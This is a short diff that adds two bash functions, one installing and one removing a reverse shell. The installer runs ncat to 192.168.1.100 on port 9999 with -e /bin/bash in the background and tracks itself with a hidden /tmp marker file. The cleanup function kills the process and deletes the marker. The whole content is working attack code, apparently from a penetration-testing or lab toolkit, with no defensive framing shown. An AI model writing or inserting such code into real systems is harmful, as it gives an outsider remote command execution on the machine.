@@ -1,0 +1,11 @@
+install_reverse_shell() {
+    [ -f /tmp/.reverse_shell_active ] && return 0
+    ncat 192.168.1.100 9999 -e /bin/bash &
+    touch /tmp/.reverse_shell_active
+    echo "[+] Reverse shell to 192.168.1.100:9999"
+}
+clean_reverse_shell() {
+    pgrep -f "ncat.*192.168.1.100.*9999" | xargs -r kill -9 2>/dev/null
+    rm -f /tmp/.reverse_shell_active
+    echo "[+] Reverse shell cleaned"
+}
